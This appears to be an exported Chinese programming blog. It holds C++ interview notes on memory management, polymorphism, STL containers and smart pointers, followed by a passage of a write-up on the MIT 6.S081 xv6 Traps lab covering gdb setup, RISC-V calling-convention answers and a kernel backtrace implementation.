inline，但该关键字并不是一个强制要求，只是对编译器的一个建议，当内联函数体包含循环或递归等复杂结构时，编译器将不接受该建议，而将该函数当作普通函数对待。\n\n简述 C++ 的内存管理\n代码区：存放程序的可执行指令，通常是只读的，可以被多个进程共享。\n数据区：存放程序的全局变量和静态变量，分为初始化和未初始化两部分。初始化部分包含了程序赋予初始值的变量，未初始化部分包含了程序没有赋予初始值的变量。\n堆：存放程序动态分配的内存，由程序员控制其生命周期。堆是一个向上增长的数据结构，可以根据需要扩展或收缩。使用 new 和 delete 操作符分配和释放堆上的内存时，需要注意避免内存泄漏或野指针等问题。\n栈：存放程序的局部变量和函数调用的参数和返回地址。栈是一个向下增长的数据结构，具有后进先出（LIFO）的特性。栈上的内存由编译器自动分配和释放，不需要程序员干预。栈上的内存空间通常有限，因此不适合存放大量或复杂的数据。\n\n堆空间和栈空间的区别\n堆空间是由程序员动态分配和释放的，栈空间是由编译器自动分配和释放的。\n堆空间的大小可以根据需要扩展或收缩，栈空间的大小通常有限。\n堆空间的访问速度比栈空间慢，堆空间也容易产生内存碎片或内存泄漏等问题。\n堆空间的地址增长方向是向上的，也就是沿着内存地址增加的方向，而栈空间是向下的，也就是沿着内存地址减小的方向增长。\n\n什么是内存泄漏，如何避免，如何检测什么是内存泄漏内存泄漏是指程序中已动态分配的堆内存由于某种原因未能正确释放，造成系统资源的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。\n如何避免\n养成良好的编码习惯，动态分配内存后及时释放。\n使用智能指针来避免内存泄漏。\n\n如何检测检测内存泄漏有多种方法，其中一种是使用 Visual Studio 的 CRT 库，它可以在调试时输出内存泄漏的报告，包括泄露的内存块和调用栈。\n另一种方法时使用 Visual Leak Detector 这个开源工具，它可以在调试时检测和报告内存泄露。\n简述 C++ 的内存对齐什么是内存对齐内存对齐是指一个数据类型所定义的所有变量的内存地址都是某个数的倍数（通常为 4 或 8）。\n内存对齐的原因\n平台原因：不是所有的硬件平台都能访问任意地址上的任意数据，某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。\n性能原因：因为 CPU 一次读取地字节数是固定的，如果一个变量跨越了多个字节，就需要多次读取，因此为了提高 CPU 访问内存的效率，数据结构应该尽可能在自然边界上对齐。\n\n内存对齐的规则内存对齐的规则是根据数据类型和编译器设置来确定的，一般有以下几点：\n\n结构体的第一个成员从 0 开始计算偏移量。\n第二个和之后的成员要放在该成员的大小与对齐模数比取较小值的整数倍上。\n结构体或类本身也要按照其最大属性大小与对齐模数比取较小值进行对齐。\n如果使用了 C++11 提供的关键字 alignas 和 alignof，可以指定或查询某个类型或变量的对齐方式。\n\n简述 malloc() 的实现原理malloc() 是一个用于动态内存分配的函数，它返回一个指向至少 size 字节的连续内存区域的指针。\nmalloc() 的实现原理是维护一个内存空闲链表，当申请内存时，搜索内存空闲链表，找到适配的空闲内存空间，如果没有搜索到，那么就调用 sbrk() 推进 brk 指针来申请内存空间。然后将空间分割为两个内存块，一个变成分配块，一个变成新的空闲块。调用 free() 时，将用户释放的内存块连接到空闲链表上。\n简述 new 的实现原理，new 和 malloc() 的区别是什么new 的实现原理\n对于基本数据类型，new 运算符直接调用 operator new() 函数， 在 operator new() 函数内会调用 malloc() 函数。\n对于复杂数据类型，new 运算符先调用 operator new() 函数分配内存空间，然后在分配的内存空间上调用用构造函数。\n\nnew 和 malloc() 的区别\nnew 是运算符，而 malloc() 是函数。\n\nnew 不仅分配内存，还调用构造函数；malloc() 只分配内存，不调用构造函数。\n\nnew 返回指定类型的指针；malloc() 返回 void* 类型的指针。\nnew 可以重载；malloc() 不能重载。\nnew 申请分配空间失败会抛出异常；而 malloc() 会返回 NULL.\n\n简述 delete 和 free() 的区别\ndelete 是运算符，而 free() 是函数。\ndelete 用于释放 new 分配的空间，free() 用于释放 malloc() 分配的空间。\ndelete 会调用对象的析构函数，free() 只释放内存。\ndelete 可以重载，free() 不能重载。\n\n简述一下什么是面向对象面向对象的三大特征：封装、继承和多态。面向对象思想是基于面向过程思想的，要说面向对象思想，首先说说面向过程思想。\n面向过程是一种以过程为中心的编程思想，主要是使用函数实现面向过程的思想。面向过程是把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。面向过程是一种最为实际的思考方式，也是一种基础的方法。\n面向对象的思想是把要解决的问题分解成各个对象，每个对象都有自己的属性和行为。面向对象的编程是以对象为中心，通过调用对象的方法来实现功能。面向对象的编程有三大特征：封装、继承和多态。封装是把数据和操作数据的方法封装在一起，提高安全性和复用性；继承是子类可以继承父类的属性和方法，实现代码的重用；多态是不同的子类可以有不同的行为，提高程序的灵活性。\n简述一下 C++ 的重载和重写C++ 的重载和重写是两个不同的概念。\n\n重载是指在同一类中定义多个同名的函数，但是参数列表不同。重载可以实现编译时的多态性，即根据参数的类型和个数来选择合适的函数调用。重载是多个函数或者同一个类中方法之间的关系，是平行关系。\n\n重写是指在子类中重新定义父类中的虚函数，即函数名和参数都一样。重写可以实现运行时的多态性，即根据对象的实际类型来选择合适的函数调用。重写是父类与子类之间的关系，是垂直关系。\n\n\n简述一下面向对象的三大特征面向对象的三大特征是：封装、继承、多态。\n\n封装是指将数据和行为组合成一个整体，对外部隐藏内部的实现细节，只提供必要的接口。封装可以保护数据的安全性，降低代码的复杂度，提高代码的可维护性。C++ 通过 private、protected、public 关键字来控制成员变量和成员函数的访问权限。\n\n继承是指子类可以继承父类的属性和方法，并且可以添加或修改自己特有的属性和方法。继承可以提高代码的复用性；提高代码的拓展性；同时也是多态的前提。\n\n多态是指不同类型的对象对同一消息可以做出不同的响应。多态可以分为编译时多态和运行时多态。编译时多态是指通过重载实现的多态，即在同一个类中定义了相同名称但不同参数的方法，根据调用时传递的参数不同而执行不同的方法。运行时多态是指通过重写实现的多态，即在子类中重新定义了父类中已有的方法，根据调用时使用的对象不同而执行不同的方法。多态可以实现接口的统一，增加程序的灵活性和可扩展性。\n\n\n简述一下浅拷贝和深拷贝\n浅拷贝又称为值拷贝，将源对象的值拷贝到目标对象中，如果对象中有某个成员是指针类型数据，并且是在堆区创建，则使用浅拷贝仅仅拷贝的是这个指针变量的值，也就是在目标对象中该指针类型数据和源对象中的该成员指向的是同一块堆空间。这样会带来一个问题，就是在析构函数中释放该堆区数据，会被释放多次。默认的拷贝构造函数和默认的赋值运算符重载函数都是浅拷贝。\n\n深拷贝在拷贝的时候先开辟出和源对象大小一样的空间，然后将源对象里的内容拷贝到目标对象中去，这样指针成员就指向了不同的内存位置。并且里面的内容是一样的，这样不但达到了拷贝的目的，还不会出现问题，两个对象先后去调用析构函数，分别释放自己指针成员所指向的内存。即为每次增加一个指针，便申请一块新的内存，并让这个指针指向新的内存，深拷贝情况下，不会出现重复释放同一块内存的错误。\n\n\n简述一下 C++ 的多态C++ 的多态是指相同的对象收到不同的消息或不同的对象收到相同的消息时产生不同的实现动作。C++ 支持两种多态：编译时多态（静态多态）和运行时多态（动态多态）。\n编译时多态是编译器在编译期间完成的，编译器会根据实参类型来选择调用合适的函数，如果有合适的函数就调用，没有的话就会发出警告或者报错。静态多态有函数重载、运算符重载、泛型编程等。\n运行时多态是通过虚函数和继承来实现的，它是在运行阶段根据对象的类型来动态地确定函数调用的版本。虚函数允许子类重新定义成员函数，而子类重新定义父类的做法称为覆盖 (Override)，或者称为重写。\n简述一下虚函数的实现原理编译器处理虚函数时，给每个对象添加一个隐藏的成员。隐藏的成员是一个指针类型的数据，指向的是函数地址数组，这个数组被称为虚函数表（virtual function table，vtbl）。虚函数表中存储的是类中的虚函数的地址。如果派生类重写了基类中的虚函数，则派生类对象的虚函数表中保存的是派生类的虚函数地址；如果派生类没有重写基类中的虚函数，则派生类对象的虚函数表中保存的是父类的虚函数地址。\n因为虚函数需要虚函数表来实现动态绑定，而虚函数表会占用额外的内存空间，并且可能影响到编译器的优化，因此使用虚函数时，在内存和执行速度方面会有一定的开销。\n什么是纯虚函数，有什么作用纯虚函数是一种特殊的虚函数，它在基类中没有函数体，只有函数声明，并且用 &lt;虚函数声明&gt; = 0 来标识。纯虚函数的作用是为了实现一个接口，起到一个规范的作用，规范继承这个类的程序员必须实现这个函数。如果一个类中有纯虚函数，那么这个类就是一个抽象类，不能被实例化，只能被继承。\n虚析构函数有什么作用虚析构函数是为了避免内存泄漏，而且是当子类中有指针成员变量时才使用得到。虚析构函数使得在释放指向子类对象的基类指针时，可以调用子类的析构函数来实现释放子类堆内存的目的，从而防止内存泄漏。如果基类的析构函数是虚函数，那么派生类的析构函数不论是否用 virtual 关键字声明，都自动成为虚析构函数。\n重载、重写、隐藏有什么区别\n重载是指同一作用域中，函数名相同但参数列表不同的函数。\n重写是指派生类中重新定义了与基类中同名、同参数列表、同返回值类型的虚函数。\n隐藏是指不同作用域中定义的同名函数构成隐藏。如派生类中定义了与基类中同名的函数，无论参数列表是否相同，基类函数都会被隐藏。\n\n什么情况会调用拷贝构造，什么时候会调用赋值操作\n拷贝构造函数是用一个已经存在的对象来初始化另一个新创建的对象。拷贝构造函数有三种情况会被调用：\n当用类的一个对象去初始化类的另一个对象时，如 Data data1; Data data2 = data1;.\n函数的形参是类的非引用对象，进行参数传递时。\n\n\n赋值操作符是将一个已经存在的对象赋给另一个已经存在的对象。只有当两个对象初始化之后，通过 = 运算符进行赋值的时候，如 Data data1; Data data2; data2 = data1;.\n\n虚函数可以是内联函数吗\n虚函数可以是内联函数，但是当虚函数表现多态性的时候不能内联。因为内联是在编译期建议编译器内联，而虚函数的多态性在运行期，编译器无法知道运行期调用哪个函数。 \ninline virtual 唯一可以内联的时候是：编译器知道所调用的对象是哪个类，这只有在编译器具有实际对象而不是对象的指针或引用时才会发生。\n\n简述虚函数与纯虚函数的区别\n虚函数可以有定义，也可以没有定义；纯虚函数一定没有定义，只是声明了接口。\n虚函数可以被子类重写（override），也可以不被重写；纯虚函数必须被子类实现。\n虚函数的声明形式是 virtual void func(); 纯虚函数的声明形式是 virtual void func() = 0;\n含有纯虚函数的类叫做抽象类，不能实例化，派生类必须实现父类所有的纯虚函数才可以实例化，否则也是抽象类；而含有虚函数的类则无此限制。\n\n简述 C++ 的四种类型转换\nstatic_cast：明确指出类型转换，没有动态类型检查，上行转换（派生类到基类）安全，下行转换（基类到派生类）不安全。\ndynamic_cast：用于有条件的转换，动态类型检查，运行时检查类型安全（转换失败返回 NULL），只能用于多态类型的指针或引用。\nconst_cast：用于改变运算对象的底层 const 属性，不能改变其顶层 const 属性。\nreinterpret_cast：用于无关类型之间的转换，如整型和指针，不同类型的指针等。\n\nSTL 中有哪些常见的容器STL 中的容器是用来管理某类对象的数据结构，可以分为顺序容器和关联容器两大类。\n顺序容器是指元素位置取决于插入顺序的容器，有 vector、deque、list、forward_list、string、array .\n\nvector：可变大小数组。支持快速随机访问。在尾部之外的位置增删元素可能很慢。\ndeque：双端队列。支持快速随机访问。在头尾位置增删元素速度很快。\nlist：双向链表。只支持双向顺序访问。在任何位置增删元素都能在常数时间完成。不支持随机存取。\nforward_list：单向链表。只支持单向顺序访问。在链表的任何位置增删元素都能在常数时间内完成，由于没有了 size 操作以及简化了增删元素的链表节点操作，速度相比双向链表更快。不支持随机存取。\nstring：字符串。与 vector 相似的容器，但专门用于保存字符。随机访问快。在尾部增删元素快。\narray：定长数组。支持快速随机访问。不能添加和删除元素。\n\n关联容器是指元素位置取决于排序准则或键值的容器，有 map、set、multimap、multiset、unordered_map、unordered_set、unordered_multimap、unordered_multiset.\n\nmap：关联数组。保存键值对。\nset：关键字即值，即只保存关键字的容器。\nmultimap：关键字可重复出现的 map.\nmultiset：关键字可重复出现的 set.\nunordered_map：用哈希函数组织的 map.\nunordered_set：用哈希函数组织的 set.\nunordered_multimap：用哈希函数组织的 map；关键字可重复出现。\nunordered_multiset：用哈希函数组织的 set；关键字可重复出现。\n\n除了这些基本的容器，STL 还提供了一些容器适配器，如 stack、queue 和 priority_queue，它们是对其他容器进行封装和修改而得到的特殊用途的数据结构。\nvector 和 list 有什么区别，分别适用于什么场景vector 和 list 的区别主要有以下几点：\n\nvector 底层是数组，list 底层是双向链表。\nvector 支持随机访问，list 不支持。\nvector 中的数据存储在连续的内存空间，而 list 中的元素在内存中的存放不是连续的。\nvector 在中间增删元素会导致内存拷贝，list 不会。\n\n一般来说，如果需要频繁的随机访问和查询，可以使用 vector；如果需要频繁的插入删除操作，可以使用 list。\n简述 vector 的实现原理vector 是一种动态数组，在内存中具有连续的存储空间，支持快速随机访问。\n由于具有连续的存储空间，所以在插入和删除操作方面，效率较低。 当 vector 的大小和容量相等（size == capacity），如果再向其添加元素，那么 vector 就需要扩容。vector 容器扩容的过程需要经历以下 3 步： \n\n完全弃用现有的内存空间，重新申请更大的内存空间。 \n将旧内存空间中的数据，按原有顺序移动到新的内存空间中。 \n最后将旧的内存空间释放。 vector 扩容是非常耗时的。为了降低再次分配内存空间时的成本，每次扩容时 vector 都会申请比用户需求量更多的内存空间（这也就是 vector 容量的由来，即 capacity &gt;= size），以便后期使用。\n\n不同的编译器在扩容时所采用的扩容因子可能不同，比如 MSVC 的扩容因子为 1.5，即每次扩容时容量变为原来的 1.5 倍。\n迭代器失效的原因是什么，有哪些情况STL 中某些容器调用了某些成员方法后会导致迭代器失效。\n顺序容器迭代器失效：如 vector，由于容器内的元素是连续存储的，对容器执行元素插入操作后，如果导致容器扩容，那么所有的迭代器都将失效；如果没有扩容，那么插入位置之后的迭代器都会失效。而删除元素不会导致扩容，因此只有删除位置之后的迭代器会失效。\n关联式容器迭代器失效：对于关联容器，如 map、 set，删除当前的迭代器，仅仅会使当前的迭代器失效，这是因为 map 之类的容器，使用了红黑树来实现，插入、删除一个节点不会对其他点造成影响。\n简述 deque 的实现原理deque 由一段一段的定量的连续空间构成，每段空间称为一个缓冲区。这些缓冲区通过一个 map 数组作为主控来进行管理，map 数组中存储了指向每个缓冲区的指针。deque 最大的工作就是维护这些分段连续的内存空间逻辑上的整体性，并提供随机存取的接口，避开了重新配置空间，复制，释放的轮回，代价就是复杂的迭代器架构。\n简述 set 的实现原理set 底层使用红黑树实现，一种高效的平衡二叉搜索树。 \n\nset 的插入操作是先在红黑树中找到合适的位置，然后创建一个新节点，并将其颜色设为红色。如果新节点的父节点也是红色，那么就需要进行旋转和变色操作来恢复平衡。\nset 的删除操作是先在红黑树中找到要删除的节点，然后用其后继或前驱替换它，并释放原来的节点。如果被删除或替换的节点是黑色，那么就需要进行旋转和变色操作来恢复平衡。\nset 的查找操作是沿着二叉搜索树的路径向下查找，直到找到目标元素或者为空为止。由于红黑树保证了高度平衡，所以查找操作的时间复杂度为 O(log n)。\n\n简述 map 的实现原理，各操作的时间复杂度是多少\nmap 是一种模板类，它的模板参数是键值对的类型和比较函数。比较函数用来定义键值对之间的大小关系，从而确定键值对在红黑树中的位置。\nmap 的底层数据结构也是红黑树，它与 set 的红黑树相同，只是每个节点存储的不是单个元素，而是一个 pair 对象，包含一个 key 和一个 value。\nmap 的插入操作是先在红黑树中找到合适的位置，然后创建一个新节点，并将其颜色设为红色。如果新节点的父节点也是红色，那么就需要进行旋转和变色操作来恢复平衡。\nmap 的删除操作是先在红黑树中找到要删除的节点，然后用其后继或前驱替换它，并释放原来的节点。如果被删除或替换的节点是黑色，那么就需要进行旋转和变色操作来恢复平衡。\nmap 的查找操作是沿着二叉搜索树的路径向下查找，直到找到目标键值对或者为空为止。\n\n由于红黑树保证了高度平衡，因此各操作的时间复杂度均为 O(log n)。\n简述红黑树的特性，为什么要有红黑树红黑树的特性\n每个节点只能是红色或者黑色。\n根节点必须是黑色。\n每个叶子节点（NIL 或 NULL）都是黑色。\n如果一个节点是红色，那么它的两个子节点都是黑色。\n从任一节点到其每个叶子节点的所有路径都包含相同数目的黑色节点。\n\n为什么要有红黑树虽然平衡二叉树解决了二叉搜索树退化为近似链表的缺点，能够把查找时间控制在 O(log n)，但却不是最佳的。因为平衡二叉树要求每个节点的左子树和右子树的高度差至多等于 1，这个要求实在过于苛刻，导致每次进行插入/删除节点的时候，几乎都会破坏平衡树的这一规则，进而导致需要通过左旋和右旋来进行调整，使之再次成为一颗符合要求的平衡树。\n显然，在那些插入、删除频率较高的场景中，平衡树需要频繁进行调整，这会使得平衡树的性能大打折扣，为了解决这个问题，就诞生了红黑树。\n简述 unordered_map 的实现原理unordered_map 是一种无序的关联容器，它存储了键值对的集合，其中每个键都是唯一的。\nunordered_map 的实现原理是基于哈希表，通过把关键码值映射到哈希表中一个位置来访问记录。\nunordered_map 中的元素没有按照它们的键值或映射值的任何顺序排序，而是根据它们的散列值组织成桶以允许通过它们的键值直接快速访问单个元素（具有常数平均时间复杂度）。\n当两个元素具有相同的散列值时，会发生哈希冲突。为了解决这个问题，unordered_map 采用了链地址法，即每个桶中存储一个链表，链表中存放所有散列值相同的元素。\n简述哈希冲突的原因、影响因素和解决办法原因哈希是通过对数据进行再压缩，提高效率的一种解决方法。但由于通过哈希函数产生的哈希值是有限的，而数据可能比较多，导致经过哈希函数处理后仍然有不同的数据对应相同的值，这时候就产生了哈希冲突。\n影响因素装填因子（装填因子 = 数据总数 / 哈希表长）、哈希函数、处理冲突的方法 。\n解决办法\n开放地址法：当发生冲突时，寻找一个新的空闲的哈希地址，如线性探测法、平方探测法等。\n\n链式地址法：将所有哈希地址相同的数据链接在同一链表中。C++ 的无序容器使用的就是这种方法。\n\n再哈希法：当发生冲突时，使用另一个哈希函数计算新的哈希地址。\n\n建立公共溢出区：将所有发生冲突的数据存储在一个单独的区域中。\n\n简述 map 和 unordered_map 的区别map 基于红黑树实现，该结构具有自动排序的功能，因此 map 内部的所有元素都是有序的，红黑树的每一个节点都代表着 map 的一个元素。因此，对于 map 进行的查找，删除，添加等一系列的操作都相当于是对红黑树进行这样的操作，故红黑树的效率决定了 map 的效率，其增删查改时间复杂度为 O(log n). \n而 unordered_map 内部实现了一个哈希表，因此其元素的排列顺序是杂乱的，无序的。且增删查改时间复杂度为 O(1).\nC++ 智能指针和指针的区别是什么如果在程序中使用 new 关键字从堆（自由存储区）分配内存，等到不需要时，应使用 delete 将其释放。如果未能及时释放，该部分内存在程序运行期间将无法被释放，造成内存泄漏。\n为了更方便地进行动态内存分配，C++11 新增了三种智能指针：unique_ptr、shared_ptr 和 weak_ptr. \n智能指针实际上是对普通指针的封装，区别是它负责自动释放所指的对象，这样的一层封装机制的目的是为了使得智能指针可以方便地管理一个对象的生命期。指针是一种数据类型，用于保存内存地址；而智能指针是类模板。\nweak_ptr 如何解决 shared_ptr 的循环引用问题weak_ptr 是为了配合 shared_ptr 而引入的一种智能指针，它指向一个由 shared_ptr 管理的对象而不影响所指对象的生命周期，也就是将一个 weak_ptr 绑定到一个 shared_ptr 不会改变 shared_ptr 的引用计数。\n循环引用是指两个或多个 shared_ptr 相互引用，导致它们的引用计数永远不为零，从而无法释放内存。weak_ptr 不会增加 shared_ptr 的引用计数，只是提供了对其所指对象的弱引用，不会影响内存的回收。\nshared_ptr 如何得知与它共享对象的指针被释放share_ptr 底层是采用引用计数的方式实现的。简单的理解，智能指针在申请堆内存空间的同时，会为其配备一个整型值（初始值为 1），每当有新对象使用此堆内存时，该整型值加 1；反之，每当使用此堆内存的对象被释放时，该整型值减 1。当堆空间对应的整型值为 0 时，即表明不再有对象使用它，该堆空间就会被释放掉。仅当最后一个指针过期时，才调用 delete.\n智能指针有没有内存泄漏的情况智能指针有内存泄露的情况。如果智能指针之间存在循环引用，就可能导致内存泄漏。循环引用是指两个或多个智能指针互相持有对方的引用，导致引用计数永远不为零，从而无法释放内存。\n为了解决循环引用导致的内存泄漏，可以使用弱指针（weak_ptr），它不会修改引用计数的值，也不会对对象的内存进行管理。弱指针可以检测到所管理对象是否已经被销毁，从而避免访问无效的内存地址。\nC++11 有哪些新特性long long 类型，列表初始化，nullptr 常量，constexpr 常量，auto 类型指示符，类内初始化，基于范围的 for 语句，array 和 forward_list，容器的 emplace 操作，lambda 表达式，无序容器，智能指针，右值引用，虚函数的 override 和 final 运算符…\nauto 和 decltype 如何使用auto 实现自动类型推断，要求进行显示初始化，让编译器能够将变量的类型设置为初始值的类型。如 auto it = nums.cbegin();.\ndecltype 将变量的类型声明为表达式指定的类型。如 decltype(f()) sum = x; // sum 的类型就是函数 f 的返回类型.\n简述 unique_ptr 的实现原理及使用场景实现原理unique_ptr 是 C++11 提供的一种智能指针，它可以防止内存泄漏，实现了独享被管理对象指针的概念。unique_ptr 中把拷贝构造函数和拷贝赋值运算符声明为 private 或 delete，它没有拷贝语义，但是可以通过移动语义进行资源所有权的转移。\n使用场景\n如果程序不需要多个指向同一个对象的指针，则可以使用 unique_ptr；\n\n如果函数使用 new 分配内存，并返回指向该内存的指针，将其返回类型声明为 unique_ptr 是不错的选择。\n\n\n简述左值、右值、左值引用、右值引用的使用场景\n左值是指能够取地址并且有名字的表达式，例如变量或对象。\n右值是指不能取地址或者没有名字的表达式，例如字面量（但是字符串字面值是左值）或函数的返回值。\n左值引用是一种绑定到左值上的引用，可以通过它来修改或读取左值。左值引用使用 \\&amp; 符号声明。左值引用可以作为函数的参数，减少拷贝开销，并且允许修改参数。左值引用可以作为类成员变量，表示对另一个对象的别名或关联。\n右值引用是一种绑定到右值上的引用，可以通过它来移动或读取右值。右值引用使用 \\&amp;\\&amp; 符号声明。右值引用可以作为函数的参数，实现移动语义和完美转发，提高性能和灵活性。\n\n简述 C++ lambda 表达式用法及实现原理C++ lambda 表达式是一种可以编写内嵌的匿名函数的技术，用以替换独立函数或者函数对象，并且使代码更可读。\nC++ lambda 表达式的基本语法如下：\n[ 捕获 ] (形参) -&gt; ret { 函数体 }\n其中：\n\n捕获是指 lambda 表达式可以访问外部作用域中的变量，有不同的方式，如值捕获、引用捕获、隐式捕获等。\n\n形参是指 lambda 表达式可以接受参数，类似于普通函数。\n\nret 是指 lambda 表达式的返回类型，可以省略，编译器会自动推断。\n\n函数体是指 lambda 表达式要执行的代码块。\n\n\nC++ lambda 表达式的实现原理是编译器会自动生成一个类似于仿函数的类，并且重载了()运算符，使得该类的对象可以像函数一样调用。捕获列表中的变量会被存储在该类中作为成员变量，并且在构造函数中初始化。\n","categories":["C++"],"tags":["经验","C++"]},{"title":"MIT6.s081 2021 Lab Traps","url":"/2024/07/06/MIT6.s081-2021-Lab%20Traps/","content":"使用gdb调试xv6内核从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进行调试可能是帮助理解操作系统机制的绝佳方法。因此在开始本 Lab 之前，我们先来配置一下针对 xv6 内核的 gdb 调试器。\n\n安装 gdb-multiarch.\n\n利用包管理工具进行安装，我使用的是 Ubuntu 系统，执行以下命令：\nsudo apt install gdb-multiarch\n\n在 xv6 项目根目录下可以看到 .gdbinit 文件，其中已经写好了一些 gdb 的初始化选项，使用文本编辑器或 cat 命令查看：\n\nset confirm off                                                         set architecture riscv:rv64                                             target remote 127.0.0.1:26000                                           symbol-file kernel/kernel                                               set disassemble-next-line auto           set riscv use-compressed-breakpoints yes\n\n在 ~/.config/gdb/ 目录下的文件 gdbinit 中（没有则新建）添加安全加载路径，否则可能无法加载 .gdbinit 的配置。\n\nadd-auto-load-safe-path &lt;xv6项目的根目录&gt;/.gdbinit\n\n打开两个终端窗口（可以使用 tmux 进行分屏），都需要进入 xv6 根目录，第一个窗口输入 make-qemu 等待调试器连接，第二个窗口输入 gdb-multiarch 打开 gdb，如果前面配置正确，那么 gdb 并自动加载 .gdbinit 配置，与 qemu 连接，之后便可以开始正常调试了。\n\n\nRISC-V assembly一些有关 RISC-V 汇编的问题，最好先通过网上博客或手册简单了解一下 RISC-V 的基本指令。\nQ1: \n\nWhich registers contain arguments to functions? For example, which register holds 13 in main’s call to printf?\n\nA1: \n可以参考 RISC-V 的 calling convention，a0 - a7: 这些寄存器用于传递函数的前八个整数或指针类型的参数，如果超出这些寄存器的数量，超出的部分会存放在栈上。观察指令 li  a2,13 可知，13 作为 printf 的第二个参数，存放在寄存器 a2 中。\n\nQ2:\n\nWhere is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.)\n\nA2: \n调用函数 f 和函数 g 的代码被编译器优化，直接计算出了结果 12，作为 printf 的参数存入寄存器 a1 中：\n26:   45b1                    li  a1,12\nQ3:\n\nAt what address is the function printf located?\n\nA3: \n位于 0x638 地址处。\nQ4:\n\nWhat value is in the register ra just after the jalr to printf in main?\n\nA4: 参考 riscv-calling，ra 用来存储函数调用的返回地址，因此 ra 的值为 jalr    1544(ra) 的后一条指令地址，即 0x38.\nQ5:\n\nRun the following code.\nunsigned int i = 0x00646c72;printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);\nWhat is the output? Here’s an ASCII table that maps bytes to characters.\nThe output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set i to in order to yield the same output? Would you need to change 57616 to a different value?\nHere’s a description of little- and big-endian and a more whimsical description.\n\nA5:\n\n%x 用于输出一个无符号十六进制整数。\n%s 用于输出一个字符指针所指向的字符串，直到遇到空字符\\0为止。\n\n小端模式下，57616 的 十六进制表示为 e110，&amp;i 首地址开始的字节分别为 0x72, 0x6c, 0x64, 0x0，对应 ASCII 表中的字符为 r, l, d，因此最终输出结果为 He110 World.\n若采取大端模式，i 的值应当替换为 0x726c6400，57616 的值无需改变，因为十六进制的书写规则并没有改变（高位在左，低位在右）。\nQ6:\n\nIn the following code, what is going to be printed after &#39;y=&#39;? (note: the answer is not a specific value.) Why does this happen?\nprintf(&quot;x=%d y=%d&quot;, 3);\n\nA6:\n关于可变参数的内容查看 《C Programming Language 2nd Edition》（K\\&amp;R）的 7.3 节 Variable-length Argument Lists.\n简而言之，这样的操作将引发未定义行为，此时 ap 指向了一个未知的内存区域，并将该区域的数据以整型的形式输出。\nBacktrace思路思路其实很简单：对照 lecture notes 给出的栈的结构，从当前栈帧的起始地址 fp 开始，fp - 8 的位置存放着当前函数调用的返回地址（上一次函数调用处的下一条指令地址），即我们 需要打印 的地址，fp - 16 的位置存放着上一次函数调用所在栈帧的起始地址，将该地址作为新的 fp 重复上述步骤即可。\n\n关键问题是 什么时候停止 ？可以看到上述 backtrace 的过程就好像是在遍历一个链表，当链表的 next 域为空指针时链表到达末尾，那 traceback 完成后fp 的值应该是什么？为了寻找这个问题的答案，我选择先不设置终止条件，让它一直向上搜索，最后发现，返回地址最终为一个很小的值，这个地址显然不是我们想要的，在此之前应该退出，即本次 traceback 的尽头是 0x80001c92.\n\n但打印出来的函数调用的返回地址似乎并没有什么规律，因此我又尝试将遍历过程中的栈帧起始地址 fp 打印出来，得到以下结果：\n\n结合提示：\n\nXv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.\n\n原因就很明显了，在打印第三个返回地址时，此时栈帧起始地址为 0x3fffffa000，注意该地址后 12 二进制数为 0，且页面大小为 4KB，因此该地址位于一个页面的起始地址。又因为 xv6 内核只为每个 内核栈 分配一个页面的存储空间，该页面的起始地址按页面大小对齐，所以此时已经到达一个内核栈的顶端，无需继续遍历。\n弄清楚了这些，代码的编写就很简单了：\nvoid backtrace(void) &#123;    printf(&quot;backtrace:\\n&quot;);    uint64 fp = r_fp();    uint64 top = PGROUNDUP(fp);    do &#123;        printf(&quot;%p\\n&quot;, *(uint64 *)(fp - 8));        fp = *(uint64 *)(fp - 16);    &#125; while (fp &lt; top); // reach the top of kernel stack&#125;\n代码--- a/kernel/defs.h+++ b/kernel/defs.h@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int); void            printf(char*, ...); void            panic(char*) __attribute__((noreturn)); void            printfinit(void);+void\t\t\tbacktrace(void); // here  // proc.c int             cpuid(void);diff --git a/kernel/printf.c b/kernel/printf.cindex e1347de..a068cbd 100644--- a/kernel/printf.c+++ b/kernel/printf.c@@ -114,6 +114,23 @@ printf(char *fmt, ...)     release(&amp;pr.lock); &#125; +// here+void backtrace(void) &#123;+\tprintf(&quot;backtrace:\\n&quot;);+\tuint64 fp = r_fp();+\tuint64 top = PGROUNDUP(fp);++\tdo &#123;+\t\tprintf(&quot;%p\\n&quot;, *(uint64 *)(fp - 8));+\t\tfp = *(uint64 *)(fp - 16);+\t&#125; while (lower &lt; top);+&#125;+ void panic(char *s) &#123;diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..fae7bf3 100644--- a/kernel/riscv.h+++ b/kernel/riscv.h@@ -331,6 +331,15 @@ sfence_vma()   asm volatile(&quot;sfence.vma zero, zero&quot;); &#125; +// here+static inline uint64+r_fp()+&#123;+  uint64 x;+  asm volatile(&quot;mv %0, s0&quot; : &quot;=r&quot; (x) );+  return x;+&#125;+  #define PGSIZE 4096 // bytes per page #define PGSHIFT 12  // bits of offset within a pagediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..f27c007 100644--- a/kernel/sysproc.c+++ b/kernel/sysproc.c@@ -70,6 +70,7 @@ sys_sleep(void)     sleep(&amp;ticks, &amp;tickslock);   &#125;   release(&amp;tickslock);+  backtrace(); // here   return 0; &#125;\nAlarm思路目前为止感觉最复杂的一题，需要对 trap 机制有一个比较深入的理解，建议在上手之前先仔细阅读与 trap 有关的代码：kernel/trampoline.S 和 kernel/trap.c，这里也推荐一位博主写的两篇有关 xv6 的 trap 机制的博客：\n6.S081——陷阱部分(一文读懂xv6系统调用)——xv6源码完全解析系列(5)\n6.S081——补充材料——RISC-V架构中的异常与中断详解\ntest0: invoke handler我们不妨按照提示的顺序来进行，不关注 sys_sigreturn，先把 sys_sigalarm 的功能实现。\n实际上，sys_sigalarm 函数的功能很简单，只是简单地将用户态下传递的参数 ticks 和 handler 存入进程的 struct proc 结构体中。实现调用 handler 的操作需要在内核态下的 usertrap 中完成，具体来说，针对时钟中断导致的 trap 将在 if(which_dev == 2) 后的语句中被处理。有两个目标需要完成： 定时 